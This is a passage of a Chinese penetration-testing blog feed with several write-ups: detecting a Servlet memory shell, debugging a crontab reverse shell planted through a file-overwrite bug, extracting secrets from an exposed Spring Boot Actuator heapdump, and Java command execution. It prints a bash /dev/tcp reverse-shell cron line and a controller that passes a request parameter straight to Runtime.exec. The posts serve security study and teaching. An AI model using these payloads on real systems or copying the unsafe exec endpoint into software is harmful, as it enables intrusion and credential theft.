这里已经成功了</p><p>根据内存马中的路径和传参去执行命令验证</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/8.jpg" alt="image-20240526165239016"></p><p>成功收到dnslog</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/9.jpg" alt="image-20240526165259925"></p><p>命令执行成功，也就意味着getshell，后续任何操作 有命令执行的条件 皆可为</p><h5 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h5><p>现在，我们以蓝队，或者被攻击者的视角，去排查servlet内存马的问题，我们如何去发现，排查，以及修复。</p><p><strong>一、</strong></p><p>servlet内存马，必须需要jsp文件的落地，也就是会有新文件的增加，我们只需要着重关注jsp后缀即可</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/10.jpg" alt="image-20240526165751575"></p><p>我们看到新增的jsp文件，去把他进行下载，分析代码做了什么来决定后续的操作，是webshell还是内存马？</p><p><strong>二、</strong></p><p>jsp文件落地后，当内存马注册成功，攻击者会将jsp文件删除，这样，我们就需要在日志或者流量设备中分析请求的路径。首先</p><p>访问了一个上传成功的jsp文件</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/11.jpg" alt="image-20240526170601313"></p><p>但假设攻击者已经将其删除，这个文件不存在了，但内存马已经注册成功，这个就可以成为分析的要点：访问了成功上传的文件，但是这个文件现在已经不存在</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/12.jpg" alt="image-20240526170710111"></p><p>如果这样，就要去分析 攻击者的请求，内存马必然是有一个映射路径的，而这个路径 大都不是存在于项目的源码中</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/13.jpg" alt="image-20240526171205301"></p><p>我们就可以从对这个项目的了解，它有哪些映射路径？哪些映射路径何时进行了修改 什么时候又增加了哪些映射路径，根据文件上传命令执行这一系列的时间，综合去分析，比如案例中的源码，就两个映射路径<code>@WebServlet(&quot;/upload&quot;)</code> 和<code>@WebServlet(&quot;/HelloWorld&quot;)</code>，攻击者访问了memeshell居然还是200 ，所以memshell 当然就是内存马的映射路径</p><p><strong>三、</strong></p><p>使用工具进行排查和分析 以及 修复！</p><p>tomcat-memshell-scanner ：<a href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a></p><p>上传到任意web目录中即可</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/14.jpg" alt="image-20240526172528692"></p><p>​它会jvm中运行的类可视化展示，提供对class文件的下载 以及kill</p><p>​通过这个工具，观察可疑的Serlvet name，映射路径，Serlvet class，Servlet classLoader以及它所处的具体文件</p><p>​具体去查看 源码中有无这个映射路径，或者磁盘上有无这个class</p><p>​servlet内存马 需要着重观察JSP Servlet类加载器 JasperLoader，有这个 极大概率为内存马文件</p><p>​将可疑的class进行下载 反编译看源码。</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/15.jpg" alt="image-20240526173452775"></p><p> 这里也是我们刚刚的内存马</p><p> kill即可</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/16.jpg" alt="image-20240526173759490"></p><p>这里的话 内存马也就失效了</p><p>重启也可以，但是实际中 重启是最后一招，因为重启对重大业务影响非常的大</p><p>这里只是演示简单的 这个流程和思路，后续会持续更新</p><h4 id="END"><a href="#END" class="headerlink" title="END"></a>END</h4>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件覆盖漏洞-crontab反弹shell细节问题</title>
      <link href="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/"/>
      <url>/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="crontab反弹shell细节问题"><a href="#crontab反弹shell细节问题" class="headerlink" title="crontab反弹shell细节问题"></a>crontab反弹shell细节问题</h2><p>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担。</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​此文是小生针对于springboot框架下，文件上传漏洞RCE姿势研究过程中，衍生出来的一个问题，在[tari]师傅的帮助与自己的苦心研究下，终于得出结果。</p><p>​当遇到文件上传漏洞、或者文件覆盖、任意文件写入漏洞，无法上传目标脚本文件，或者说上传了但不解析…..诸多一系列问题，就不再提了，相信大家也都遇到过，利用姿势也不多，大家最容易想到的，应该就是 corntab反弹shell。</p><p>​有的时候，收不到shell原因非常之多，可能是防火墙，可能是态感，可能是各种设备，可能是乱七八糟的策略，但也有可能是自己payload存在问题。</p><p>​我想这篇博客的标题也可以叫做：</p><h3 id="Linux系统与Http协议换行不同而导致反弹shell异常问题"><a href="#Linux系统与Http协议换行不同而导致反弹shell异常问题" class="headerlink" title="Linux系统与Http协议换行不同而导致反弹shell异常问题"></a>Linux系统与Http协议换行不同而导致反弹shell异常问题</h3><h4 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h4><h5 id="场景还原"><a href="#场景还原" class="headerlink" title="场景还原"></a>场景还原</h5><h6 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h6><p>​首先，小生以攻击者视角，用最基础原生反弹shell做演示，方便引入对这个问题的理解</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/1.png" alt="image-20240515181734190"></p><p>​这个时候，当我们打开这个文件</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/2.png" alt="image-20240515181832512"></p><p>​会出现这种情况，这是因为，没有为其添加换行导致的</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/3.png" alt="image-20240515181851893"></p><p>​这里shell也不会接受到，<strong>因为在crontab中，每一行表示一个计划任务，如果最后一行没有以换行符结尾，那么crontab会认为这不是一个完整，或者是一个无效的命令，所以它不会去执行</strong>，也就说这里没有收到shell的原因，是反弹shell的命令没有被crontab执行</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/4.png" alt="image-20240515181944708"></p><p>这里我们查看日志证明出了，我们的结论，命令没有被执行，所以没有接收到shell</p><h6 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h6><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/5.png" alt="image-20240515182046709"></p><p>​这个#***大家忽略就好</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/6.png" alt="image-20240515182155640"></p><p>​这里可以看到，因为携带了换行，所以反弹shell这条命令 被crontabl当做一条完整且有效的命令，得到了执行</p><p>但这个时候，反弹shell报错不明确重定向</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/7.png" alt="image-20240515182230611"></p><p>​查看日志，留意这里多了一个^M</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/8.png" alt="image-20240515182250264"></p><p>​把这个命令拿出来单独执行</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/9.png" alt="image-20240515182329079"></p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/10.png" alt="image-20240515182339208"></p><p>​这个时候，得出结论，<strong>命令的确是被执行了，但命令后面多加了一个^M，导致命令是错误的，无法接收到shell</strong></p><p>​</p><p>​这个^M又是什么，它表示回车符(\r)，在Linux中 换行符是\n，Http中 换行符是\r\n</p><p>​这就导致Http报文传输到Linux系统中，出现了对换行解析的问题(直接写入，未处理换行问题)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Http报文 : </span><br><span class="line"></span><br><span class="line">* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.100.1/9000 0&gt;&amp;1\r\n</span><br><span class="line"></span><br><span class="line">写入到Linux的文件就变成了:</span><br><span class="line"></span><br><span class="line">* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.100.1/9000 0&gt;&amp;1^M\n</span><br><span class="line"></span><br><span class="line">* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.100.1/9000 0&gt;&amp;1^M</span><br><span class="line"></span><br><span class="line">[我是新的一行哦]</span><br></pre></td></tr></table></figure><h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p>由简单到麻烦的方法 如下</p><h6 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h6><p>使用nc反弹</p><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/11.png" alt="image-20240515182620932"></p><p>细心发现 我这里没有写root，因为在后续的学习中，我发现加和不加没有任何影响，因为计划任务的机制中，以文件名确定用户名</p><p>日志查看</p><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/12.png" alt="image-20240515182638060"></p><p>这里可以看到后面有^M，但依然收到了反弹的shell</p><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/13.png" alt="image-20240515182657146"></p><p><strong>一个细节就是 bash的位置要写绝对路径！</strong>这个我也没搞清楚是为什么，后续有时间再研究，再对博客进行更新修改</p><h6 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h6><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/14.png" alt="image-20240515182828077"></p><p>删除掉这个\r     原理上述已经讲过 就不赘述了</p><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/15.png" alt="image-20240515182846976"></p><p>查看日志</p><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/16.png" alt="image-20240515182906134"></p><p>这里可以看到^M已经没有了</p><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/17.png" alt="image-20240515182922777"></p><p>成功接收到，其他渗透测试工具中，了解了原理 自然也就会改了。</p><h6 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h6><p>​关于计划任务文件中，对环境变量的设置，因为时间问题，还有我这个环境，就不在做演示了，那一种虽然也可以，比较麻烦，就是通过先声明环境变量</p><p>SHELL&#x3D;&#x2F;bin&#x2F;bash</p><p>PATH&#x3D;&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</p><p>MAILTO&#x3D;root</p><p>后面再跟改好的命令</p><h4 id="END"><a href="#END" class="headerlink" title="END"></a>END</h4>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Springboot之Actuator-heapdump漏洞</title>
      <link href="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Springboot之Actuator-heapdump漏洞"><a href="#Springboot之Actuator-heapdump漏洞" class="headerlink" title="Springboot之Actuator-heapdump漏洞"></a>Springboot之Actuator-heapdump漏洞</h1><p>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</p><h3 id="Springboot"><a href="#Springboot" class="headerlink" title="Springboot"></a>Springboot</h3><p>​Spring Boot为了解决Spring Framework的入门难度大、配置繁琐而诞生，简化了Spring框架的配置，达到了快速开发提高效率</p><h4 id="Actuator"><a href="#Actuator" class="headerlink" title="Actuator"></a>Actuator</h4><p>​springboot下的一个监控服务，无访问控制的情况下，可以通过HTTP 和 JMX访问，也就意味着存在未授权访问漏洞。在其中，不同的断点对应着不同的目标信息</p><p>​在渗透测试过程中，对攻击者来着，特别需要留意的几个端点</p><table><thead><tr><th><strong>Endpoint ID</strong></th><th><strong>Description</strong></th><th>exploit</th></tr></thead><tbody><tr><td>&#x2F;env</td><td>主机运行开放的所有服务</td><td>根据开发的服务，利用历史披露漏洞</td></tr><tr><td>&#x2F;heapdump</td><td>内存转储文件</td><td>下载后提取shiroKey、ak&#x2F;sk、springboot-admin-client账号密码等等</td></tr><tr><td>&#x2F;trace&#x2F;httptrace</td><td>请求追踪信息</td><td>cookie&#x2F;session等会话凭证泄露</td></tr><tr><td>&#x2F;actuator</td><td>监控主节点</td><td>对端点来说，类似书签管理器</td></tr><tr><td>&#x2F;refresh</td><td>刷新配置</td><td>触发进程刷新，以此来执行我们传入的命令</td></tr></tbody></table><p>补充：在springboot 1.x版本中，直接在上下文路径拼接断点即可访问。但是，到了springboot 2.x版本中，必须加入&#x2F;actuator，例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.example.com/env//version:1.x</span></span><br><span class="line">https:<span class="comment">//www.example.com/actuator/env//version:2.x</span></span><br></pre></td></tr></table></figure><h3 id="heapdump漏洞复现"><a href="#heapdump漏洞复现" class="headerlink" title="heapdump漏洞复现"></a>heapdump漏洞复现</h3><p>​这里演示heapdump的利用-<strong>从内存转储文件中来获取Java 应用程序的内存使用情况</strong>。虽然&#x2F;env下有RCE漏洞，但是有一个Eureka-Client的功能依赖作为前置条件，还需搭配&#x2F;refresh，没有&#x2F;refresh，即使有env下的RCE，有Eureka-Client，也不可能利用成功。在实战中，对于笔者来说从没遇到过，反而heapdump 频率确实非常之高。</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>​这里使用的是阿里云spring脚手架：<a href="https://start.aliyun.com/">https://start.aliyun.com/</a></p><p><img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/1.png" alt="image-20240317154654078"></p><p><img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/2.png" alt="image-20240317154838485"></p><h5 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h5><p>​引入actuator的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="application-properties"><a href="#application-properties" class="headerlink" title="application.properties"></a>application.properties</h5><p>​配置暴露所有actuator端点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">management.endpoints.web.exposure.include=*</span><br></pre></td></tr></table></figure><h5 id="启动并访问"><a href="#启动并访问" class="headerlink" title="启动并访问"></a>启动并访问</h5><p><img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/3.png" alt="image-20240317155450633"></p><p>​<img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/4.png" alt="image-20240317155646582"></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>​解析heapdump有常用的三款工具：MAT、jvisualvm、JDumpSpider，比较推荐JDumpSpider，这里演示后两种</p><p>​访问</p><p>​<img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/5.png" alt="image-20240317155904840"></p><p>​<img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/6.png" alt="image-20240317160019518"></p><h5 id="jvisualvm"><a href="#jvisualvm" class="headerlink" title="jvisualvm"></a>jvisualvm</h5><p>​Java VisualVM，简称 JVisualVM，是 JDK 自带的一个图形化工具，用于监控、故障排除和性能调优 Java 应用程序。它位于 JAVA_HOME&#x2F;bin 目录下，提供了丰富的功能，能够帮助开发人员对 Java 应用程序进行监控和分析。对于我们来说，就是可以直接查看heapdump中的信息。</p><p>​<img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/7.png" alt="image-20240317160648167"></p><p>​<img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/8.png" alt="image-20240317160731842"></p><p>装入&#x3D;&gt;选择heapdump</p><p><img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/9.png" alt="image-20240317160950829"></p><p>后续对敏感信息的获取，比如shiro的密钥，ak&#x2F;sk，Redis的明文密码等等等，都需要使用OQL语法，在oql控制台中进行查询</p><p>没装组件，凑个图</p><p><img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/10.png" alt="image-20240317163759422"></p><h5 id="JDumpSpider"><a href="#JDumpSpider" class="headerlink" title="JDumpSpider"></a>JDumpSpider</h5><p>​<a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p><p>​这个比jvisualvm更人性化一点，毕竟jvisualvm不是为了做渗透的，它自动对敏感信息进行读取，我们就不用再用oql语句查询了</p><p>​<img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/11.png" alt="image-20240317164125859"></p><p>​后面的信息就不截图了，总之得到了heapdump可以说目标机器已经被拿下了</p><p>​</p><h1 id="end"><a href="#end" class="headerlink" title="end"></a><em>end</em></h1>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java命令执行</title>
      <link href="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="Java命令执行"><a href="#Java命令执行" class="headerlink" title="Java命令执行"></a>Java命令执行</h2><p>​</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>​<strong>自己的学习记录，如有不足或疑问，欢迎指出或提问，谢谢。</strong></p><p>​文章介绍java的命令执行 以及 通过反射调用命令执行的扫盲知识。</p><p>​原生JDK提供了三个类来执行系统命令：java.lang.Runtime、java.lang.ProcessBuilder、java.lang.ProcessImpl。</p><p>​本文都是基于springboot实现web，不乏会有些注解。</p><h3 id="java-lang-Runtime"><a href="#java-lang-Runtime" class="headerlink" title="java.lang.Runtime"></a>java.lang.Runtime</h3><p>​java.lang包下的一个类，默认被导入，也就是说我们无需手动import，即可调用此类里面的方法</p><p>​Runtime是java.lang的一个类，主要是与操作系统交互执行命令，其中最常用的 就是<code>exec() </code></p><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/1.png" alt="image-20240310141721486"></p><p>​jdk8中，<code>exec()</code>有六种重载形式，可以传入不同的参数类型来执行命令，这里演示<strong>exec(String command)<strong>、</strong>exec(String[] cmdarray)</strong></p><h4 id="exec-String-command"><a href="#exec-String-command" class="headerlink" title="exec(String command)"></a>exec(String command)</h4><p>​在单独的进程中执行指定的字符串命令。</p><p>​简单来说就是直接执行字符串命令。</p><h5 id="java实现"><a href="#java实现" class="headerlink" title="java实现"></a>java实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//示例</span></span><br><span class="line"><span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实现 </span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">cmdstring</span><span class="params">(String command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">        <span class="comment">//使用BufferedReader设置编码解决执行命令响应中文乱码问题</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在主方法中直接调用</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">command1</span> <span class="operator">=</span> <span class="string">&quot;cmd /c whoami&quot;</span>;</span><br><span class="line">cmdstring(command1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/2.png" alt="img"></p><h5 id="javaweb实现"><a href="#javaweb实现" class="headerlink" title="javaweb实现"></a>javaweb实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/execRuntimeString&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execRuntimeString</span><span class="params">(String command, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//逐行读取</span></span><br><span class="line">            System.out.println(line);</span><br><span class="line">            out.print(line);</span><br><span class="line">        &#125;</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此处简单说一下注解，这三个都是spring框架中的注解，后续文章中再次出现，笔者就不在赘述了。</p><p><strong>@Controller</strong>：声明此类为控制器，也就是MVC中的”C”：controller层代码的功能</p><p><strong>@ResponseBody</strong>：当方法被调用时，返回的对象将被转换为响应体，并发送给客户端</p><p><strong>@RequestMapping</strong>：映射请求路径和方法，类似于Servlet中的@WebServlet</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url：http://localhost:8080/execRuntimeString?command=whoami</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/3.png" alt="image-20240310151224849"></p><h4 id="exec-String-cmdarray"><a href="#exec-String-cmdarray" class="headerlink" title="exec(String[] cmdarray)"></a>exec(String[] 